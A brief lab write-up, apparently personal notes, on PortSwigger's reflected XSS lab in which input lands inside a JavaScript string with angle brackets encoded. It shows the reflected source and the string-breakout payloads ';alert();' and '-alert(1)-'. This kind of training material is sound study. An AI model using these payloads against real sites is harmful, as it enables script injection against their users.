# Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded

```bash
# search abc1234 and view page source and look for abc1234

<script>var searchTerms = 'abc1234';alert();'';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">'); </script>

# The script basicly creates this
<img src="/resources/images/tracker.gif?searchTerms=abc1234">
```

```bash
# We can bypass this by
';alert();'

# We basicly create this <script>var searchTerms = 'abc1234';alert();''; which will allow us to run alert.

# I had a problem with this lab, even when i use solution they give '-alert(1)-', It still looks like i didn't solve the lab.
# But they both give you alerts so you can use them.

```
